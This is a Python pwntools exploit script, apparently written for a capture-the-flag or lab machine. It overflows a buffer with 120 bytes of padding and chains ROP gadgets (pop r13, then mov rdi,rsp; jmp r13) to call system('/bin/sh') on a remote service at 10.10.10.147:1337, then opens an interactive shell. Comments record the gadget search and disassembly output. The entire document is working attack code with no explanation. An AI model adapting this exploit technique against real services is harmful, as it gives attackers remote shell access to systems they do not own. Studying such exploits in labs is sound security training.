from pwn import *

p = remote("10.10.10.147", 1337)

buf = "A" * 120

'''
ropper --file myapp --search "pop r13"
0x0000000000401206: pop r13; pop r14; pop r15; ret;
'''

pop_r13_junk_junk = p64(0x401206)

'''
disass main
0x000000000040116e <+15>:    call   0x401040 <system@plt>
'''
 
system = p64(0x40116e)

binsh = "/bin/sh\x00"

'''
disass test
0x0000000000401156 <+4>:     mov    rdi,rsp
0x0000000000401159 <+7>:     jmp    r13
'''

test = p64(0x401156)

chain = buf + pop_r13_junk_junk + system + "BBBBBBBB" + "CCCCCCCC" + test + binsh

p.sendline(chain)
p.interactive()
